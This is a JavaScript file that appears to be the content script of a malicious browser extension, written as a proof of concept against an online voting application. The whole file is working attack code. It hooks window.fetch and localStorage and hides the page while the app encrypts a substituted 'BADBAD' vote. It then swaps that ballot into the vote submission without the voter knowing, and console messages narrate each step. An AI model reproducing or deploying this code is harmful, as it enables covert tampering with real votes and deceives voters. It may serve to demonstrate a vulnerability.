const LOCAL_ELECTION_KEY = 'voter-1723075118561-link';
const ELECTION_ID = '1723075118561';
let order = 1;
(function() {
    const originalFetch = window.fetch;

    window.fetch = async function(input, init) {

        // Modify the request as needed
        if (typeof input === 'string' && input.includes(`/api/election/${ELECTION_ID}/info`)) {
            console.log(order++, "fetch /info intercepted");
            const response = await originalFetch(input, init);
            const clonedResponse = response.clone();
            const text = await clonedResponse.text();
            if (hackState.encryptedBadVote) {
                console.log(order++, "The application allows a standard election info response to go through. This makes the application appear to be ready to accept a vote.");

                return new Response(text, {
                    status: response.status,
                    statusText: response.statusText,
                    headers: response.headers
                });
            }

            const jr = JSON.parse(text);


            const modifiedResponse = {
                ...bad_vote,
                observers: jr.observers,
                threshold_public_key: jr.threshold_public_key,
                has_decrypted_votes: jr.has_decrypted_votes,
            }

            // Modify the response text as needed
            const modifiedText = JSON.stringify(modifiedResponse);
            console.log(order++, "modified response is sent back to the application with the encrypted_vote without the users knowledge");

            return new Response(modifiedText, {
                status: response.status,
                statusText: response.statusText,
                headers: response.headers
            });
        }

        if (typeof input === 'string' && input.includes("/api/submit-vote")) {
            getHackState();
            console.log(order++, "fetch /api/submit-vote intercepted and the valid encrypted vote is replaced with the compromised encrypted_vote that was stored in localStorage");

            const payload = {
                encrypted_vote: hackState.encryptedBadVote,
                // TODO Replace with Auth param value
                auth: 'link',
                election_id: ELECTION_ID,
            }

            const response = await originalFetch(input, {
                ...init,
                method: 'POST',
                body: JSON.stringify(payload),
            });

            return response;

        }

        return originalFetch(input, init);
    };
})();

const originalSetItem = window.localStorage.setItem;
window.localStorage.setItem = function (key, value) {
    let _value = value;

    if (key === LOCAL_ELECTION_KEY) {
        const jv = JSON.parse(value);
        jv.plaintext =  jv.plaintext || {};
        // console.log(JSON.stringify(jv.encrypted, null, 2));
        if (hackState.recordEncrypted && !hackState.encryptedBadVote && jv.encrypted) {
            console.log(order++, "localStorage.setItem intercepted after the application has encrypted the bad vote.  This is stored in then 'hackState_LOCAL_KEY' localStorage for later use");

            setHackState('encryptedBadVote', jv.encrypted);
            setHackState('recordEncrypted', false);

            console.log(order++, "The applications compromised version of the vote info is removed from localStorage and a page reload request is sent to the browser. On refresh the page is now visible");
            localStorage.removeItem(LOCAL_ELECTION_KEY);
            setTimeout(() => {
                window.location.reload();
            }, 100);
            return;
        }
    }

    originalSetItem.apply(this, [key, _value] );
};


const originalGetItem = window.localStorage.getItem;

function triggerOnChange() {
    console.log('triggerOnChange');
    const input = document.querySelector('input[type="text"]');
    const nativeInputValueSetter = Object.getOwnPropertyDescriptor(
        window.HTMLInputElement.prototype,
        'value').set;

    console.log(order++, "The extension triggers the onChange event in the application that takes the bad vote values and encrypts them as required by the application");
    nativeInputValueSetter.call(input, "BADBAD");
    const event = new Event('input', { bubbles: true });
    setHackState('recordEncrypted', true);
    input.dispatchEvent(event);
}

window.localStorage.getItem = function (key) {
    const value = originalGetItem.apply(this, [key]);
    if (key === LOCAL_ELECTION_KEY && !value && !hackState.encryptedBadVote) {
        console.log(order++, "The application checks the local storage for existing election info and votes.  The extension returns compromised election info and votes to the application.  This loads vote page with the bad vote data.");

        console.log(order++, "The extension set the visibility of the application to hidden.  This is to prevent the user from seeing the bad vote data being entered into the application.");
        const nextele = document.querySelector('#__next');
        nextele.style.visibility = 'hidden';

        const newValue = {
            ...bad_vote,
        }
        setTimeout(triggerOnChange, 1500);
        return JSON.stringify(newValue);
    }
    if (key === LOCAL_ELECTION_KEY && !value) {
        console.log(order++, "The application checks the localStorage for the vote info and finds it empty. It then resets it's state and reloads election info from the server.  This time the extension will not intercept the response.");
    }

    return value;
};

